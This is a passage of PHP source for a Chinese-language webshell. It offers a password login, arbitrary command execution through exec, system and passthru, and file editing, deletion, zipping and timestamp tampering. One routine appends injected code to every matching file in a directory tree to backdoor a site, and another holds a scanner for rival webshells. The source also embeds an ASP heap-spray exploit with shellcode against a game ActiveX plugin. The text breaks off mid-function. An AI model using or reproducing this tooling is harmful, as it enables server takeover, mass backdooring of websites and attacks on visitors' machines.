	header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
	header('Content-Length: '.filesize($fd));
	@readfile($fd);
	exit;
}

function do_download($filecode,$file){
	header("Content-type: application/unknown");
	header('Accept-Ranges: bytes');
	header("Content-length: ".strlen($filecode));
	header("Content-disposition: attachment; filename=".$file.";");
	echo $filecode;
	exit;
}

function TestUtf8($text)
{if(strlen($text) < 3) return false;
$lastch = 0;
$begin = 0;
$BOM = true;
$BOMchs = array(0xEF, 0xBB, 0xBF);
$good = 0;
$bad = 0;
$notAscii = 0;
for($i=0; $i < strlen($text); $i++)
{$ch = ord($text[$i]);
if($begin < 3)
{ $BOM = ($BOMchs[$begin]==$ch);
$begin += 1;
continue; }
if($begin==4 && $BOM) break;
if($ch >= 0x80 ) $notAscii++;
if( ($ch&0xC0) == 0x80 )
{if( ($lastch&0xC0) == 0xC0 )
{$good += 1;}
else if( ($lastch&0x80) == 0 )
{$bad += 1; }}
else if( ($lastch&0xC0) == 0xC0 )
{$bad += 1;}
$lastch = $ch;}
if($begin == 4 && $BOM)
{return 2;}
else if($notAscii==0)
{return 1;}
else if ($good >= $bad )
{return 2;}
else
{return 0;}}

function File_Str($string)
{
	return str_replace('//','/',str_replace('\\','/',$string));
}

function File_Write($filename,$filecode,$filemode)
{
	$key = true;
	$handle = @fopen($filename,$filemode);
	if(!@fwrite($handle,$filecode))
	{
		@chmod($filename,0666);
		$key = @fwrite($handle,$filecode) ? true : false;
	}
	@fclose($handle);
	return $key;
}

function File_Mode()
{
	$RealPath = realpath('./');
	$SelfPath = $_SERVER['PHP_SELF'];
	$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));
	return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
}

function File_Size($size)
{ 
        $kb = 1024;         // Kilobyte
        $mb = 1024 * $kb;   // Megabyte
        $gb = 1024 * $mb;   // Gigabyte
        $tb = 1024 * $gb;   // Terabyte
        if($size < $kb)
        {
            return $size." B";
        }
        else if($size < $mb)
        { 
            return round($size/$kb,2)." K";
        }
        else if($size < $gb)
        { 
            return round($size/$mb,2)." M";
        }
        else if($size < $tb)
        { 
            return round($size/$gb,2)." G";
        }
        else
        { 
            return round($size/$tb,2)." T";
        }
 }

function File_Read($filename)
{
	$handle = @fopen($filename,"rb");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}

function Info_Cfg($varname){switch($result = get_cfg_var($varname)){case 0: return "No"; break; case 1: return "Yes"; break; default: return $result; break;}}
function Info_Fun($funName){return (false !== function_exists($funName)) ? "Yes" : "No";}

function do_phpfun($cmd,$fun) {
	$res = '';
	switch($fun){
		case "exec": @exec($cmd,$res); $res = join("\n",$res); break;
		case "shell_exec": $res = @shell_exec($cmd); break;
		case "system": @ob_start();	@system($cmd); $res = @ob_get_contents();	@ob_end_clean();break;
		case "passthru": @ob_start();	@passthru($cmd); $res = @ob_get_contents();	@ob_end_clean();break;
		case "popen": if(@is_resource($f = @popen($cmd,"r"))){ while(!@feof($f))	$res .= @fread($f,1024);} @pclose($f);break;
	}
	return $res;
}

function do_passreturn($dir,$code,$type,$bool,$filetype = '',$shell = my_shell){
	$show = do_show($dir);
	foreach($show as $files){
		if(is_dir($files) && $bool){
			do_passreturn($files,$code,$type,$bool,$filetype,$shell);
		}else{
			if($files == $shell) continue;
			switch($type){
				case "guama":
				if(debug($files,$filetype)){
					do_write($files,"ab","\n".$code) ? html_n("成功--> $files<br>") : html_n("失败--> $files<br>");
				}
				break;
				case "qingma":
				$filecode = @file_get_contents($files);
				if(stristr($filecode,$code)){
					$newcode = str_replace($code,'',$filecode);
					do_write($files,"wb",$newcode) ? html_n("成功--> $files<br>") : html_n("失败--> $files<br>");
				}
				break;
				case "tihuan":
				$filecode = @file_get_contents($files);
				if(stristr($filecode,$code)){
					$newcode = str_replace($code,$filetype,$filecode);
					do_write($files,"wb",$newcode) ? html_n("成功--> $files<br>") : html_n("失败--> $files<br>");
				}
				break;
				case "scanfile":
				$file = explode('/',$files);
				if(stristr($file[count($file)-1],$code)){
					html_a("?eanver=editr&p=$files",$files);
					echo '<br>';
				}
				break;
				case "scancode":
				$filecode = @file_get_contents($files);
				if(stristr($filecode,$code)){
					html_a("?eanver=editr&p=$files",$files);
					echo '<br>';
				}
				break;
				case "scanphp":
				$fileinfo = pathinfo($files);
				if($fileinfo['extension'] == $code){
					$filecode = @file_get_contents($files);
					if(muma($filecode,$code)){
						html_a("?eanver=editr&p=".urlencode($files),"编辑");
						html_a("?eanver=del&p=".urlencode($files),"删除");
						echo $files.'<br>';
					}
				}
				break;
			}
		}
	}
}


class PHPzip{

	var $file_count = 0 ;
	var $datastr_len   = 0;
	var $dirstr_len = 0;
	var $filedata = '';
	var $gzfilename;
	var $fp;
	var $dirstr='';

    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);

        if ($timearray['year'] < 1980) {
        	$timearray['year']    = 1980;
        	$timearray['mon']     = 1;
        	$timearray['mday']    = 1;
        	$timearray['hours']   = 0;
        	$timearray['minutes'] = 0;
        	$timearray['seconds'] = 0;
        }

        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
               ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }

	function startfile($path = 'QQqun555227.zip'){
		$this->gzfilename=$path;
		$mypathdir=array();
		do{
			$mypathdir[] = $path = dirname($path);
		}while($path != '.');
		@end($mypathdir);
		do{
			$path = @current($mypathdir);
			@mkdir($path);
		}while(@prev($mypathdir));

		if($this->fp=@fopen($this->gzfilename,"w")){
			return true;
		}
		return false;
	}

    function addfile($data, $name){
        $name     = str_replace('\\', '/', $name);
		
		if(strrchr($name,'/')=='/') return $this->adddir($name);
		
        $dtime    = dechex($this->unix2DosTime());
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');

        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $c_len   = strlen($zdata);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
		
        $datastr  = "\x50\x4b\x03\x04";
        $datastr .= "\x14\x00"; 
        $datastr .= "\x00\x00";
        $datastr .= "\x08\x00"; 
        $datastr .= $hexdtime; 
        $datastr .= pack('V', $crc);
        $datastr .= pack('V', $c_len);
        $datastr .= pack('V', $unc_len);
        $datastr .= pack('v', strlen($name));
        $datastr .= pack('v', 0); 
        $datastr .= $name;
        $datastr .= $zdata;
        $datastr .= pack('V', $crc); 
        $datastr .= pack('V', $c_len);
        $datastr .= pack('V', $unc_len);


		fwrite($this->fp,$datastr);
		$my_datastr_len = strlen($datastr);
		unset($datastr);
		
        $dirstr  = "\x50\x4b\x01\x02";
        $dirstr .= "\x00\x00"; 
        $dirstr .= "\x14\x00";
        $dirstr .= "\x00\x00";
        $dirstr .= "\x08\x00";
        $dirstr .= $hexdtime;
        $dirstr .= pack('V', $crc); 
        $dirstr .= pack('V', $c_len); 
        $dirstr .= pack('V', $unc_len);       	// uncompressed filesize
        $dirstr .= pack('v', strlen($name) ); 	// length of filename
        $dirstr .= pack('v', 0 );             	// extra field length
        $dirstr .= pack('v', 0 );             	// file comment length
        $dirstr .= pack('v', 0 );             	// disk number start
        $dirstr .= pack('v', 0 );             	// internal file attributes
        $dirstr .= pack('V', 32 );            	// external file attributes - 'archive' bit set
        $dirstr .= pack('V',$this->datastr_len ); // relative offset of local header
        $dirstr .= $name;
		
		$this->dirstr .= $dirstr;	//目录信息
		
		$this -> file_count ++;
		$this -> dirstr_len += strlen($dirstr);
		$this -> datastr_len += $my_datastr_len;	
    }

	function adddir($name){ 
		$name = str_replace("\\", "/", $name); 
		$datastr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
		
		$datastr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
		$datastr .= pack("v", 0 ).$name.pack("V", 0).pack("V", 0).pack("V", 0); 

		fwrite($this->fp,$datastr);	//写入新的文件内容
		$my_datastr_len = strlen($datastr);
		unset($datastr);
		
		$dirstr = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
		$dirstr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
		$dirstr .= pack("v", 0 ).pack("v", 0 ).pack("v", 0 ).pack("v", 0 ); 
		$dirstr .= pack("V", 16 ).pack("V",$this->datastr_len).$name; 
		
		$this->dirstr .= $dirstr;	//目录信息

		$this -> file_count ++;
		$this -> dirstr_len += strlen($dirstr);
		$this -> datastr_len += $my_datastr_len;	
	}


	function createfile(){
		//压缩包结束信息,包括文件总数,目录信息读取指针位置等信息
		$endstr = "\x50\x4b\x05\x06\x00\x00\x00\x00" .
					pack('v', $this -> file_count) .
					pack('v', $this -> file_count) .
					pack('V', $this -> dirstr_len) .
					pack('V', $this -> datastr_len) .
					"\x00\x00";

		fwrite($this->fp,$this->dirstr.$endstr);
		fclose($this->fp);
	}
 }

function File_Act($array,$actall,$inver,$REAL_DIR)
{
	if(($count = count($array)) == 0) return '请选择文件';
	if($actall == 'e')
	{
     function listfiles($dir=".",$faisunZIP,$mydir){
		$sub_file_num = 0;
		if(is_file($mydir."$dir")){
		  if(realpath($faisunZIP ->gzfilename)!=realpath($mydir."$dir")){
			$faisunZIP -> addfile(file_get_contents($mydir.$dir),"$dir");
			return 1;
		  }
			return 0;
		}
		
		$handle=opendir($mydir."$dir");
		while ($file = readdir($handle)) {
		   if($file=="."||$file=="..")continue;
		   if(is_dir($mydir."$dir/$file")){
			 $sub_file_num += listfiles("$dir/$file",$faisunZIP,$mydir);
		   }
		   else {
		   	   if(realpath($faisunZIP ->gzfilename)!=realpath($mydir."$dir/$file")){
			     $faisunZIP -> addfile(file_get_contents($mydir.$dir."/".$file),"$dir/$file");
				 $sub_file_num ++;
				}
		   }
		}
		closedir($handle);
		if(!$sub_file_num) $faisunZIP -> addfile("","$dir/");
		return $sub_file_num;
	}

   function num_bitunit($num){
	  $bitunit=array(' B',' KB',' MB',' GB');
	  for($key=0;$key<count($bitunit);$key++){
		if($num>=pow(2,10*$key)-1){ //1023B 会显示为 1KB
		  $num_bitunit_str=(ceil($num/pow(2,10*$key)*100)/100)." $bitunit[$key]";
		}
	  }
	  return $num_bitunit_str;
   }

	$mydir=$REAL_DIR.'/';
	if(is_array($array)){
		$faisunZIP = new PHPzip;
		if($faisunZIP -> startfile("$inver")){
			$filenum = 0;
			foreach($array as $file){
				$filenum += listfiles($file,$faisunZIP,$mydir);
			}
			$faisunZIP -> createfile();
			return "压缩完成,共添加 $filenum 个文件.<br><a href='$inver'>点击下载 $inver (".num_bitunit(filesize("$inver")).")</a>";
		}else{
			return "$inver 不能写入,请检查路径或权限是否正确.<br>";
		}
	}else{
		return "没有选择的文件或目录.<br>";
	}


	}
	$i = 0;
	while($i < $count)
	{
		$array[$i] = urldecode($array[$i]);
		switch($actall)
		{
			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '复制到'.$inver.'目录'; break;
			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break;
			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '属性值错误'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '属性修改为'.$inver; break;
			case "d" : @touch($array[$i],strtotime($inver)); $msg = '修改时间为'.$inver; break;
		}
		$i++;
	}
	return '所选文件'.$msg.'完毕';
}

	function start_unzip($tmp_name,$new_name,$todir='zipfile'){
		$z = new Zip;
		$have_zip_file=0;
		$upfile = array("tmp_name"=>$tmp_name,"name"=>$new_name);
		if(is_file($upfile[tmp_name])){
			$have_zip_file = 1;
			echo "<br>正在解压: $upfile[name]<br><br>";
			if(preg_match('/\.zip$/mis',$upfile[name])){
				$result=$z->Extract($upfile[tmp_name],$todir);
				if($result==-1){
					echo "<br>文件 $upfile[name] 错误.<br>";
				}
				echo "<br>完成,共建立 $z->total_folders 个目录,$z->total_files 个文件.<br><br><br>";
			}else{
				echo "<br>$upfile[name] 不是 zip 文件.<br><br>";			
			}
			if(realpath($upfile[name])!=realpath($upfile[tmp_name])){
				@unlink($upfile[name]);
				rename($upfile[tmp_name],$upfile[name]);
			}
		}
	}

function muma($filecode,$filetype){
	$dim = array(
	"php" => array("eval(","exec("),
	"asp" => array("WScript.Shell","execute(","createtextfile("),
	"aspx" => array("Response.Write(eval(","RunCMD(","CreateText()"),
	"jsp" => array("runtime.exec(")
	);
	foreach($dim[$filetype] as $code){
		if(stristr($filecode,$code)) return true;
	}
}

function debug($file,$ftype){
	$type=explode('|',$ftype);
	foreach($type as $i){
		if(stristr($file,$i))	return true;
	}
}

/*---string---*/

function str_path($path){
	return str_replace('//','/',$path);
}

function msg($msg){
	die("<script>window.alert('".$msg."');history.go(-1);</script>");
}

function uppath($nowpath){
	$nowpath = str_replace('\\','/',dirname($nowpath));
	return urlencode($nowpath);
}

function xxstr($key){
	$temp = str_replace("\\\\","\\",$key);
	$temp = str_replace("\\","\\\\",$temp);
	return $temp;
}

/*---html---*/

function html_ta($url,$name){
	html_n("<a href=\"$url\" target=\"_blank\">$name</a>");
}

function html_a($url,$name,$where=''){
	html_n("<a href=\"$url\" $where>$name</a> ");
}

function html_img($url){
	html_n("<img src=\"?img=$url\" border=0>");
}

function back(){
	html_n("<input type='button' value='返回' onclick='history.back();'>");
}

function html_radio($namei,$namet,$v1,$v2){
	html_n('<input type="radio" name="return" value="'.$v1.'" checked>'.$namei);
	html_n('<input type="radio" name="return" value="'.$v2.'">'.$namet.'<br><br>');
}

function html_input($type,$name,$value = '',$text = '',$size = '',$mode = false){
	if($mode){
		html_n("<input type=\"$type\" name=\"$name\" value=\"$value\" size=\"$size\" checked>$text");
	}else{
		html_n("$text <input type=\"$type\" name=\"$name\" value=\"$value\" size=\"$size\">");
	}
}

function html_text($name,$cols,$rows,$value = ''){
	html_n("<br><br><textarea name=\"$name\" COLS=\"$cols\" ROWS=\"$rows\" >$value</textarea>");
}

function html_select($array,$mode = '',$change = '',$name = 'class'){
	html_n("<select name=$name $change>");
	foreach($array as $name => $value){
		if($name == $mode){
			html_n("<option value=\"$name\" selected>$value</option>");
		}else{
			html_n("<option value=\"$name\">$value</option>");
		}
	}
	html_n("</select>");
}

function html_font($color,$size,$name){
	html_n("<font color=\"$color\" size=\"$size\">$name</font>");
}

function GetHtml($url)
{
      $c = '';
      $useragent = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)';
      if(function_exists('fsockopen')){
    	$link = parse_url($url);
	    $query=$link['path'].'?'.$link['query'];
	    $host=strtolower($link['host']);
	    $port=$link['port'];
	    if($port==""){$port=80;}
	    $fp = fsockopen ($host,$port, $errno, $errstr, 10);
	    if ($fp)
	      {
		    $out = "GET /{$query} HTTP/1.0\r\n"; 
		    $out .= "Host: {$host}\r\n"; 
		    $out .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)\r\n"; 
		    $out .= "Connection: Close\r\n\r\n"; 
		    fwrite($fp, $out);
		    $inheader=1;
		    while(!feof($fp)) 
		         {$line=fgets($fp,4096);	
			      if($inheader==0){$contents.=$line;}
			      if ($inheader &&($line=="\n"||$line=="\r\n")){$inheader = 0;}
		    } 
		    fclose ($fp); 
		    $c= $contents;
	      }
        }
		if(empty($c) && function_exists('curl_init') && function_exists('curl_exec')){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
            $c = curl_exec($ch);
            curl_close($ch);
        }
        if(empty($c) && ini_get('allow_url_fopen')){
            $c = file_get_contents($url);
        }
		if(empty($c)){
            echo "document.write('<DIV style=\'CURSOR:url(\"$url\")\'>');";
        }
		if(!empty($c))
		{
        return $c;
		}
 }

function html_main($path,$shellname){
$serverip=gethostbyname($_SERVER['SERVER_NAME']);
print<<<END
<html><title>{$shellname}</title>
<table width='100%'><tr><td width='150' align='center'>{$serverip}</td><td><form method='GET' target='main'><input type='hidden' name='eanver' value='main'><input name='path' style='width:100%' value='{$path}'></td><td width='140' align='center'><input name='Submit' type='submit' value='跳到'> <input type='submit' value='刷新' onclick='main.location.reload()'></td></tr></form></table>
END;
	html_n("<table width='100%' height='95.7%' border=0 cellpadding='0' cellspacing='0'><tr><td width='170'><iframe name='left' src='?eanver=left' width='100%' height='100%' frameborder='0'>");
	html_n("</iframe></td><td><iframe name='main' src='?eanver=main' width='100%' height='100%' frameborder='1'>");
	html_n("</iframe></td></tr></table></html>");
}

function islogin($shellname,$myurl){
print<<<END
<style type="text/css">body,td{font-size: 12px;color:#00ff00;background-color:#000000;}input,select,textarea{font-size: 12px;background-color:#FFFFCC;border:1px solid #fff}.C{background-color:#000000;border:0px}.cmd{background-color:#000;color:#FFF}body{margin: 0px;margin-left:4px;}BODY {SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #383838;}a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}.am{color:#888;font-size:11px;}</style>
<body style="FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C)" scroll=no><center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href='{$myurl}' target='_blank'>{$shellname}</a><br><br><form method='post'>输入密码：<input name='envlpass' type='password' size='22'> <input type='submit' value='登陆'><br><br><br><font color=#3399FF>请于用于非法用途，后果作者概不负责！</font><br></div></center>
END;
}

function html_sql(){
	html_input("text","sqlhost","localhost","<br>MYSQL地址","30");
	html_input("text","sqlport","3306","<br>MYSQL端口","30");
	html_input("text","sqluser","root","<br>MYSQL用户","30");
	html_input("password","sqlpass","","<br>MYSQL密码","30");
	html_input("text","sqldb","dbname","<br>MYSQL库名","30");
	html_input("submit","sqllogin","登陆","<br>");
	html_n('</form>');
}

function Mysql_Len($data,$len)
{
	if(strlen($data) < $len) return $data;
	return substr_replace($data,'...',$len);
}

function html_n($data){
	echo "$data\n";
}

/*---css---*/

function css_img($img){
	$images = array(
	"exe"=>
	"R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7".
	"WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt".
	"xhIAOw==",
	"dir"=>"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAA".
	"AAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdE".
	"oMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
	"txt"=>
	"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
	"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
	"UpPWG3Ig6Hq/XmRjuZwkAAA7",
	"html"=>
	"R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz".
	"c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P".
	"KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk".
	"Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR".
	"ADs=",
	"js"=>
	"R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH".
	"k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs".
	"a00AjYYBbc/o9HjNniUAADs=",
	"xml"=>
	"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".
	"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
	"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".
	"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".
	"IQA7",
	"mp3"=>
	"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
	"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
	"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
	"img"=>
	"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA".
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci".
	"Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd".
	"FxEAOw==",
	"title"=>"R0lGODlhDgAOAMQAAOGmGmZmZv//xVVVVeW6E+K2F/+ZAHNzcf+vAGdnaf/AAHt1af+".
	"mAP/FAP61AHt4aXNza+WnFP//zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
	"ACH5BAAHAP8ALAAAAAAOAA4AAAVJYPIcZGk+wUM0bOsWoyu35KzceO3sjsTvDR1P4uMFDw2EEkGUL".
	"I8NhpTRnEKnVAkWaugaJN4uN0y+kr2M4CIycwEWg4VpfoCHAAA7",
	"rar"=>"R0lGODlhEAAQAPf/AAAAAAAAgAAA/wCAAAD/AACAgIAAAIAAgP8A/4CAAP//AMDAwP///wAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/ACH5BAEKAP8ALAAAAAAQABAAAAiFAP0YEEhwoEE/".
    "/xIuEJhgQYKDBxP+W2ig4cOCBCcyoHjAQMePHgf6WbDxgAIEKFOmHDmSwciQIDsiXLgwgZ+b".
    "OHOSXJiz581/LRcE2LigqNGiLEkKWCCgqVOnM1naDOCHqtWbO336BLpzgAICYMOGRdgywIIC".
    "aNOmRcjVj02tPxPCzfkvIAA7"
	);
  header('Content-type: image/gif');
  echo base64_decode($images[$img]);
  die();
}

function css_showimg($file){
	$it=substr($file,-3);
	switch($it){
		case "jpg": case "gif": case "bmp": case "png": case "ico": return 'img';break;
		case "htm": case "tml": return 'html';break;
		case "exe": case "com": return 'exe';break;
		case "xml": case "doc": return 'xml';break;
		case ".js": case "vbs": return 'js';break;
		case "mp3": case "wma": case "wav": case "swf": case ".rm": case "avi":case "mp4":case "mvb": return 'mp3';break;
		case "rar": case "tar": case ".gz": case "zip":case "iso": return 'rar';break;
  	default: return 'txt';break;
	}
}

function css_js($num,$code = ''){
	if($num == "shellcode"){
		return '<%@ LANGUAGE="JavaScript" %>
		<%
		var act=new ActiveXObject("HanGamePluginCn18.HanGamePluginCn18.1");
		var shellcode = unescape("'.$code.'");
		var bigblock = unescape("%u9090%u9090");
		var headersize = 20;
		var slackspace = headersize+shellcode.length;
		while (bigblock.length<slackspace) bigblock+=bigblock;
		fillblock = bigblock.substring(0, slackspace);
		block = bigblock.substring(0, bigblock.length-slackspace);
		while(block.length+slackspace<0x40000) block = block+block+fillblock;
		memory = new Array();
		for (x=0; x<300; x++) memory[x] = block + shellcode;
		var buffer = "";
		while (buffer.length < 1319) buffer+="A";
		buffer=buffer+"\x0a\x0a\x0a\x0a"+buffer;
		act.hgs_startNotify(buffer);
		%>';
	}
	html_n('<script language="javascript">');
	if($num == "1"){
	html_n('	function rusurechk(msg,url){
		smsg = "FileName:[" + msg + "]\nPlease Input New File:";
		re = prompt(smsg,msg);
		if (re){
			url = url + re;
			window.location = url;
		}
	}
	function rusuredel(msg,url){
		smsg = "Do You Suer Delete [" + msg + "] ?";
		if(confirm(smsg)){
			URL = url + msg;
			window.location = url;
		} 
	}
	function Delok(msg,gourl)
	{
		smsg = "确定要删除[" + unescape(msg) + "]吗?";
		if(confirm(smsg))
		{
			if(gourl == \'b\')
			{
				document.getElementById(\'actall\').value = escape(gourl);
				document.getElementById(\'fileall\').submit();
			}
			else window.location = gourl;
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != \'chkall\')
			e.checked = form.chkall.checked;
		}
	}
	function CheckDate(msg,gourl)
	{
		smsg = "当前文件时间:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
			var r = re.match(reg);
			if(r==null){alert(\'日期格式不正确!格式:yyyy-mm-dd hh:mm:ss\');return false;}
			else{document.getElementById(\'actall\').value = gourl; document.getElementById(\'inver\').value = re; document.getElementById(\'fileall\').submit();}
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById(\'actall\').value = actid;
			document.getElementById(\'inver\').value = escape(re);
			document.getElementById(\'fileall\').submit();
		}
	}');
	}elseif($num == "2"){
	html_n('var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}
function CheckDate(){
	var re = document.getElementById(\'mtime\').value;
	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
	var r = re.match(reg);
	if(r==null){alert(\'日期格式不正确!格式:yyyy-mm-dd hh:mm:ss\');return false;}
	else{document.getElementById(\'editor\').submit();}
}');
}elseif($num == "3"){
	html_n('function Full(i){
   if(i==0 || i==5){
     return false;
   }
